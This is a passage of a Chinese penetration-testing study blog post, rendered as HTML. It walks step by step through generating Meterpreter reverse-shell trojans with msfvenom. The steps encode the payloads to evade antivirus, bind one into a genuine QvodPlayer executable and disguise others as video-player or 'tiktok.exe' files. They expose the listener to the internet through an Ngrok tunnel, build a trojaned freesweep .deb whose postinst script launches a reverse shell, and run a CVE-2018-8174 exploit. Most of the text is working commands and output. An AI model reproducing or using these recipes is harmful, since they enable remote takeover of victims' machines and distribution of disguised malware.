+</li>
+<li><p>-i：指定payload有效载荷编码迭代次数，指定编码加密次数，为了让杀毒软件，更难查出源代码</p>
+</li>
+<li><p>-f：指定生成格式，可以是raw，exe，elf，jar，c语言的，python的，java的。。。用-l formats查看所有支持的格式</p>
+</li>
+<li><p>-o：指定文件名称和导出位置，指定到网站根目录&#x2F;var&#x2F;www&#x2F;html，方便在肉鸡上下载后门程序</p>
+</li>
+</ul>
+<p>在MSF上启动handler开始监听后门程序</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.201.131</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>exploit<br>[*] Started <span class="hljs-comment">reverse TCP handler on 192.168.201.131:4444</span><br></code></pre></td></tr></table></figure>
+<p>需要启动apache服务<br>在靶机上访问浏览器192.168.201.131&#x2F;西瓜影音2.exe</p>
+<p>使用 virustotal 检测下生成后门的免杀能力，VirusTotal.com 是一个免费的病毒，蠕虫，木马和各种恶意软件分析服务，可以针对可疑文件和网址进行快速检测，最初由Hispasec维护。它与传统杀毒软件的不同之处是它通过多种杀毒引擎扫描文件。使用多种反病毒引擎可以令用户们通过各杀毒引擎的侦测结果，判断上传的文件是否为恶意软件。<br><a target="_blank" rel="noopener" href="https://www.virustotal.com/">网址</a></p>
+<p><img src="/images/6A1E1E84B86844449F60EA7CDFA63BA3.png" srcset="/img/loading.gif" lazyload><br>可以看到它对20个杀毒软件免杀，但大部分还是绕不过</p>
+<p>在靶机上双击启动病毒文件，这时我们成功拿到shell<br>在 MSF 终端查看建立的 session<br><img src="/images/1666D1F82092401f8DE3AF261043650E.png" srcset="/img/loading.gif" lazyload><br>Shell 中输入 ipconfig 查看 win7 主机的 IP 地址。<br><img src="/images/483A84725E614ea993814C3E802051EA.png" srcset="/img/loading.gif" lazyload><br>dir #查看当前目录下的内容<br><img src="/images/D6403343CA074ea883791BE1F5F81209.png" srcset="/img/loading.gif" lazyload><br>将会话保存到后台，方便以后使用</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">background<br>sessions <span class="hljs-comment">#查看会话</span><br>sessions -i <span class="hljs-number">1</span> <span class="hljs-comment">#指定会话 ID，调用新的会话</span><br><span class="hljs-keyword">exit</span> <span class="hljs-comment">#如果不想使用了，就退出，断开会话</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="模拟黑客给真正的快播软件加上后门"><a href="#模拟黑客给真正的快播软件加上后门" class="headerlink" title="模拟黑客给真正的快播软件加上后门"></a>模拟黑客给真正的快播软件加上后门</h3><ol>
+<li>先下载一个正常的快播软件<br><img src="/images/C997AF3AA9D44b6693895B2B1A008F8B.png" srcset="/img/loading.gif" lazyload><br>解开这个包后,找到QvodTerminal.exe 。</li>
+</ol>
+<p>先查看主程序会调用哪些附加的小程序，然后把 payload 后门和这些小程序绑定到一起。当然也可<br>以直接加到主程序上，但是加主程序上，有时报错。<br>当 QvodPlayer.exe 主程序运行时，会自动调用 QvodTerminal.exe 这个小程序。<br>通过任务管理器进程可知<br><img src="/images/2534C352E603476886ED1DD8705420F5.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li><p>上传QvodTerminal.exe到kali上</p>
+</li>
+<li><p>对QvodTerminal.exe注入payload后门程序</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">201.131</span> LPORT=<span class="hljs-number">4444</span> -<span class="hljs-string">b&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /</span>var<span class="hljs-regexp">/www/</span>html/QvodTerminal.exe<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>使用绑定了后门的 QvodTerminal.exe 替换原来的 QvodTerminal.exe<br>在 win7 虚拟机上下载绑定了后门的 QvodTerminal.exe<br>在浏览器上访问：<a target="_blank" rel="noopener" href="http://192.168.201.131/QvodTerminal.exe">http://192.168.201.131/QvodTerminal.exe</a> 下载 QvodTerminal.exe<br>将下载的 QvodTerminal.exe 替换原文件中的 QvodTerminal.exe<br><img src="/images/A60AB414CA5443259749E75475A0DD96.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>在kali上开始监听后门</p>
+</li>
+</ol>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> LHOST <span class="hljs-comment">192.168.201.131</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>run<br></code></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>打开快播主程序</li>
+</ol>
+<p>跳出窗口，运行即可</p>
+<ol start="7">
+<li>在kali上查看会话已经建立了，说明后门运行成功了</li>
+</ol>
+<p><img src="/images/81F72D26020D4026A2436A1C875E0CC1.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="8">
+<li>提权，等等操作</li>
+</ol>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">getuid<br>getsystem<span class="hljs-comment">#获取系统权限，可能没法获取</span><br><span class="hljs-built_in">run</span> vnc -i <span class="hljs-comment">#实时监控靶机电脑屏幕</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wholeliubei/article/details/139747509">更多命令在这里</a></p>
+<h3 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h3><p>外网是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</p>
+<p>处于不同局域网的两台主机是不能够互相ping通的，所以必须将攻击者的ip映射到公网上，这样受害机运行木马才能够反弹shell。</p>
+<p>内网穿透是我们在进行网络连接时的一种术语，也叫做NAT穿透，即在计算机是局域网内的时候，外网与内网的计算机的节点进行连接时所需要的连接通信，有时候就会出现内网穿透不支的情况。内网穿透的功能就是，当我们在端口映射时设置时，内网穿透起到了地址转换的功能，也就是把公网的地址进行翻译，转成为一种私有的地址，然后再采用路由的方式ADSL的宽带路由器，具有一个动态或者是固定的公网IP，最后ADSL直接在交换机上，这样所有的电脑都可以共享上网。内网穿透除了可以实现内网之间机器的网络通信功通之外。</p>
+<p>一旦获得了对系统的访问权限，攻击者可以进行侦听，横向移动及尝试提升特权，达到窃取系统或数据库中敏感数据的目的，对服务器安全乃至内网安全的危害不言而喻。</p>
+<p>这里我们到Sunny-Ngrok内网穿透服务使kali主机与Sunny-Ngrok公网服务器连接，这样处于不同局域网的主机访问Sunny-Ngrok给出的TCP隧道，数据将会传回kali主机。</p>
+<p><img src="/images/0DEFF9FAFF9C44a3A548FAAABFB33F1F.png" srcset="/img/loading.gif" lazyload></p>
+<p>Sunny-Ngrok提供免费内网穿透服务，免费服务器支持绑定自定义域名</p>
+<p>但是并不好用，这里我选择收费包</p>
+<ol>
+<li><p>进入Ngrok网站注册一个用户<br><a target="_blank" rel="noopener" href="https://www.ngrok.cc/">Sunny-Ngrok内网转发内网穿透 - 国内内网映射服务器</a></p>
+</li>
+<li><p>开启TCP通道</p>
+</li>
+</ol>
+<p><img src="/images/576E034E3AFD452f82B29FA59C01DC19.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="3">
+<li>下载Ngrok客户端</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.ngrok.cc/download.html">Sunny-Ngrok内网转发</a></p>
+<p><img src="/images/3A8EA08F4C914c14A9766DF07A6CE150.png" srcset="/img/loading.gif" lazyload><br>根据攻击机系统情况下载客户端版本（这里下载Linux 64bita版本）</p>
+<p>把下载好的Ngrok压缩包存放到kali的root目录下<br>命令解压缩：unzip linux_amd64<br>进入解压好的目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> linux_amd64<br></code></pre></td></tr></table></figure>
+
+<p>启动隧道映射TCP服务：<br>位置在隧道管理处可以看到命令<br><img src="/images/DC26EB19F2EA4bafA5D0C41FDF269868.png" srcset="/img/loading.gif" lazyload><br>执行命令即可</p>
+<ol start="4">
+<li>MSF生成外网木马程序</li>
+</ol>
+<p>注意：这里lhost和lport分别为赠送的域名和端口</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=xxx.xxx.com LPORT=<span class="hljs-number">10362</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/</span>alpha_upper -i <span class="hljs-number">10</span> -f exe -o <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>牛马影音<span class="hljs-number">2</span>.exe<br></code></pre></td></tr></table></figure>
+
+
+<p>lhost填TCP隧道上面的域名，lport填TCP域名后面的端口<br><img src="/images/FDB26B04BF6F4a86B39822D237456721.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="5">
+<li>打开msf设置payload，加载攻击模块设置本地IP和监听端口</li>
+</ol>
+<p>msfconsole</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.201.131</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>run<br></code></pre></td></tr></table></figure>
+<ol start="6">
+<li>转发生成的木马程序给目标机运行-目标机运行木马-反弹shell-操控目标机</li>
+</ol>
+<p>done</p>
+<h3 id="使用metasploit的evasion模块生成后门木马"><a href="#使用metasploit的evasion模块生成后门木马" class="headerlink" title="使用metasploit的evasion模块生成后门木马"></a>使用metasploit的evasion模块生成后门木马</h3><p>evasion是metasploit自带的模块，使用此模块可以生成反杀毒软件的木马</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">search evasion</span><br></code></pre></td></tr></table></figure>
+<p>使用 evasion&#x2F;windows&#x2F;windows_defender_exe 这个模块</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use evasion<span class="hljs-regexp">/windows/</span>windows_defender_exe<br>show <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/08C257EB19C44323B1F8B17475F3783E.png" srcset="/img/loading.gif" lazyload></p>
+<p>配置文件名参数即可</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> FILENAME <span class="hljs-comment">tiktok.exe</span><br></code></pre></td></tr></table></figure>
+
+<p>设置payload</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure>
+
+<p>设置本地监听IP和端口</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LHOST <span class="hljs-comment">192.168.201.131</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/images/BC461FDF582D4abd889CE55589D16F75.png" srcset="/img/loading.gif" lazyload></p>
+<p>开启监听后门木马</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.201.131</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>run<br></code></pre></td></tr></table></figure>
+
+<p>这个失败了,应该是生成木马脚本问题，点击tiktok后没有获得shell，而且目标机没有tiktok这个进程</p>
+<h2 id="实战-制作Linux恶意软件获取shell"><a href="#实战-制作Linux恶意软件获取shell" class="headerlink" title="实战-制作Linux恶意软件获取shell"></a>实战-制作Linux恶意软件获取shell</h2><ol>
+<li>使用msfvenom生成linux可执行文件</li>
+</ol>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x64 --platform linux -p linux<span class="hljs-regexp">/x64/m</span>eterpreter<span class="hljs-regexp">/reverse_tcp LHOST=192.168.201.131 LPORT=4444 -b &quot;\x00&quot; -f elf -o /</span>var<span class="hljs-regexp">/www/</span>html/niuma<br></code></pre></td></tr></table></figure>
+<p>参数和生成windows差不多</p>
+<ul>
+<li>–platform：指定linux<br>-f：指定elf即linux操作系统的可执行文件类型<br>-b：去掉坏字符</li>
+</ul>
+<ol start="2">
+<li>MSF配置监听</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.201.131<br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure>
+
+<p>打开centos<br>下载后门</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">201.131</span>/niuma<br></code></pre></td></tr></table></figure>
+
+<p>添加执行权限</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">777</span> niuma<br></code></pre></td></tr></table></figure>
+<p>执行程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./niuma<br></code></pre></td></tr></table></figure>
+<p><img src="/images/72400C29DF4B4bd487DE621D5BF323A4.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="实战-制作恶意deb软件包来触发后门"><a href="#实战-制作恶意deb软件包来触发后门" class="headerlink" title="实战-制作恶意deb软件包来触发后门"></a>实战-制作恶意deb软件包来触发后门</h2><p>制作恶意软件包使用–download-only 方式下载软件包不进行安装<br>注：freesweep</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">apt <span class="hljs-comment">--download-only install freesweep</span><br></code></pre></td></tr></table></figure>
+<p>将软件包移动到root目录</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archives<span class="hljs-regexp">/freesweep_1.0.2-1_amd64.deb ~/</span><br></code></pre></td></tr></table></figure>
+
+<p>解压软件包到free目录</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dpkg</span> -x freesweep_1.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>-<span class="hljs-number">1</span>_amd64.deb free<br></code></pre></td></tr></table></figure>
+
+<p>生成恶意代码到软件包源文件中</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x64 --platform linux -p linux<span class="hljs-regexp">/x64/</span>shell<span class="hljs-regexp">/reverse_tcp LHOST=192.168.201.131 LPORT=4444 -b &quot;\x00&quot; -i 10 -f elf -o /</span>root<span class="hljs-regexp">/free/u</span>sr<span class="hljs-regexp">/games/</span>freesweep_sources<br></code></pre></td></tr></table></figure>
+<p>拓展：生成软件包时无论时payload和软件包信息都需要选择能够在目标操作系统上执行的。<br>创建软件包信息目录</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir free<span class="hljs-regexp">/DEBIAN &amp;&amp; cd free/</span>DEBIAN<br></code></pre></td></tr></table></figure>
+<p>创建软件包的信息文件</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">tee /root/free/DEBIAN/control &lt;&lt; <span class="hljs-comment">&#x27;EOF&#x27;</span><br><span class="hljs-symbol">Package:</span> freesweep<br><span class="hljs-symbol">Version:</span> <span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>-<span class="hljs-number">1</span><br><span class="hljs-symbol">Section:</span> Games <span class="hljs-built_in">and</span> Amusement<br><span class="hljs-symbol">Priority:</span> <span class="hljs-keyword">optional</span><br><span class="hljs-symbol">Architecture:</span> amd64<br><span class="hljs-symbol">Maintainer:</span> Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)<br><span class="hljs-symbol">Description:</span> a <span class="hljs-keyword">text</span>-based minesweeper  Freesweep <span class="hljs-built_in">is</span> an implementation <span class="hljs-keyword">of</span> the popular minesweeper game, <span class="hljs-keyword">where</span>  one tries <span class="hljs-keyword">to</span> find all the mines without igniting any, based <span class="hljs-keyword">on</span> hints given <span class="hljs-keyword">by</span> the computer. Unlike most implementations <span class="hljs-keyword">of</span> this game, Freesweep  works <span class="hljs-keyword">in</span> any visual <span class="hljs-keyword">text</span> display - <span class="hljs-keyword">in</span> Linux console, <span class="hljs-keyword">in</span> an xterm, <span class="hljs-built_in">and</span> <span class="hljs-keyword">in</span> most <span class="hljs-keyword">text</span>-based terminals currently <span class="hljs-keyword">in</span> use.<br>EOF<br></code></pre></td></tr></table></figure>
+
+<p>创建deb软件包，安装后脚本文件，来加载后门</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">tee <span class="hljs-regexp">/root/</span>free<span class="hljs-regexp">/DEBIAN/</span>postinst &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br>#!<span class="hljs-regexp">/bin/</span>bash<br>sudo chmod <span class="hljs-number">2755</span> <span class="hljs-regexp">/usr/g</span>ames/freesweep_sources<br>sudo <span class="hljs-regexp">/usr/g</span>ames/freesweep_sources &amp;<br>EOF<br></code></pre></td></tr></table></figure>
+<p>sudo &#x2F;usr&#x2F;games&#x2F;freesweep_sources是我们要执行的恶意代码<br>&amp; 是将命令放到后台运行</p>
+<p>给脚本文件添加执行权限</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod <span class="hljs-number">755</span> <span class="hljs-regexp">/root/</span>free<span class="hljs-regexp">/DEBIAN/</span>postinst<br></code></pre></td></tr></table></figure>
+
+<p>构造新的deb安装包</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dpkg-deb --build <span class="hljs-regexp">/root/</span>free/<br></code></pre></td></tr></table></figure>
+<p>注：会在当前目录下生成构建的软件包 freesweep.db ,我们当前的目录是&#x2F;root<br><img src="/images/CAFB2BD7A5F64b10B6365A2FB1A7DC8A.png" srcset="/img/loading.gif" lazyload></p>
+<p>新打开一个终端 CTRL+SHIFT+T，生成 MSF 监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.201.131<br><span class="hljs-built_in">set</span> LPORT 4444<br>exploit<br></code></pre></td></tr></table></figure>
+<p>这里最好是在 Kali 中执行如果再 XSHELL 中执行可能会导致窗口卡死。<br>在另一台kali或ubantu上打开</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">201.131</span>/free.deb<br><br>dpkg -i free.deb<br></code></pre></td></tr></table></figure>
+<p><img src="/images/351A5F4DEF29412d9A40B472F9AABF39.png" srcset="/img/loading.gif" lazyload><br>又是一个神奇的问题，能连接上但是获取不到shell权限🆒</p>
+<p>卸载软件包</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dpkg -r freesweep</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="利用0day双杀-java环境-宏感染-安卓客户端进行渗透"><a href="#利用0day双杀-java环境-宏感染-安卓客户端进行渗透" class="headerlink" title="利用0day双杀-java环境-宏感染-安卓客户端进行渗透"></a>利用0day双杀-java环境-宏感染-安卓客户端进行渗透</h1><h2 id="利用0-DAY漏洞CVE-2018-8174获取shell"><a href="#利用0-DAY漏洞CVE-2018-8174获取shell" class="headerlink" title="利用0 DAY漏洞CVE-2018-8174获取shell"></a>利用0 DAY漏洞CVE-2018-8174获取shell</h2><ol>
+<li>安装CVE-2018-8174_EXP</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/Yt1g3r/CVE-2018-8174_EXP">https://github.com/Yt1g3r/CVE-2018-8174_EXP</a></p>
+<ol start="2">
+<li>生成恶意html文件</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">8174</span>.py -u http://<span class="hljs-number">192.168.201.131</span>/exploit.html -o hack.rtf -i <span class="hljs-number">192.168.201.131</span> -p <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
+<p>参数说明：</p>
+<ul>
+<li><p>-u：URL地址，恶意html文件hack.html的访问地址</p>
+</li>
+<li><p>-o：生成文档</p>
+</li>
+<li><p>-i：监听地址</p>
+</li>
+<li><p>-p：监听端口<br>恶意html文件生成成功</p>
+</li>
+</ul>
+<p>由于用的是python2，这里我移步centos上生成<br><img src="/images/60B0C1682C6E4a1bA20EB3EDAF0695A5.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="3">
+<li><p>将恶意html文件移动到网站根目录</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp exploit.html <span class="hljs-regexp">/var/</span>www/html<br>cp hack.rtf <span class="hljs-regexp">/var/</span>www/html<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>新打开一个终端ctrl+shift+t，生成MSF监听</p>
+</li>
+</ol>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/shell/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.201.131</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>run<br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>受害者点击恶意链接</li>
+</ol>
+<p>进入win7，打开IE或者是IE内核的浏览器，比如360浏览器，访问恶意链接</p>
+<p><img src="/images/4290ED89D3F94695A6A0D31610BAEC64.png" srcset="/img/loading.gif" lazyload></p>
+<p>也许是网络问题把，吐了。。。。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>渗透测试学习笔记</div>
+      <div>http://example.com/2024/06/24/渗透测试学习/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>奇怪的奇怪</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/24/MoeCTF2024/" title="MoeCTF2024">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">MoeCTF2024</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/29/ciscn2024/" title="ciscn2024">
+                        <span class="hidden-mobile">ciscn2024</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
